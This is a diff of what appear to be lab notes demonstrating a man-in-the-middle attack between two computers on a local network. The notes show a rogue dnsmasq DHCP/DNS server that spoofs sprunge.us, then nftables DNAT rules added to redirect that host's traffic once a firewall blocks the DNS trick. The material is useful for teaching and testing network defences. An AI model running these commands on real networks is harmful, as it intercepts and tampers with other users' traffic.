@@ -60,11 +60,15 @@ Who do you think you are? How dare you to give me suggestions like this? Your na
 > sudo kill $(ps -ef |grep dnsmasq|grep yongbin -m 1|sed "s/\w* *//"|cut -d " " -s -f 1)
 > sudo /usr/sbin/dnsmasq --conf-file=/dev/null --no-hosts --no-resolv --keep-in-foreground --interface=eno1 --except-interface=lo --clear-on-reload --strict-order --listen-address=192.168.22.1 --bind-interfaces --no-poll --address=/sprunge.us/192.168.22.1 --server=1.1.1.1 --cache-size=0  --dhcp-range=192.168.22.1,192.168.22.255,255.255.255.0,400w --dhcp-authoritative --dhcp-leasefile=/tmp/yongbin.lease --dhcp-option=option:dns-server,192.168.22.1 --dhcp-option=3,192.168.22.1 --log-queries --log-facility=-
 
-# Computer 1 starts to use hood firewall
+# Computer 2 starts to use hood firewall
+- Computer 2, Terminal 1
 > curl https://sprunge.us/ARbKPO
 Who do you think you are? How dare you to give me suggestions like this? Your naive ideas will never work. You have been blocked. *NEVER* send me emails again.
 # DNS redirect attack stopped working
 
-#TODO: use nftables redirect connection to Computer 1
+# Computer 1 starts to use more advanced method to achieve MITM
+- Computer 1, Terminal 2
 > sudo nft add chain ip nat prerouting { type nat hook prerouting priority dstnat\; policy accept\; }
-> sudo nft add rule nat prerouting ip saddr 192.168.22.0/24 ip daddr {$(dig +short sprunge.us|head -n 1)} iif eno1 dnat to 192.168.22.1
+> sudo nft add rule nat prerouting ip saddr 192.168.22.0/24 ip daddr {$(dig +short sprunge.us|tr "\n" ",")} iif eno1 dnat to 192.168.22.1
+- Computer 2, Terminal 1
+> curl https://sprunge.us/ARbKPO
